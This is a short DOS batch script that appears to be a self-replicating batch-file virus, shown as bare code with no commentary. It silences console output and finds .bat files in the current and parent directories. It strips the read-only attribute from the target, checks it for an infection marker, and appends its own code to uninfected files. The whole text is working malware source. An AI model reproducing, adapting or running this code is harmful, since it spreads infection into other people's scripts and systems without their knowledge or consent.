@ctty nul
if "%0"=="AUTOEXEC.BAT" goto rt
attrib %0 +r
for %%a in (*.bat ..\*.bat) do set _!!=%%a
attrib %_!!% -r
for %%q in (%_!!%) do find "_!!" %%q
if not errorlevel 1 goto rt
type %0 >> %_!!%
:rt
attrib %0 -r
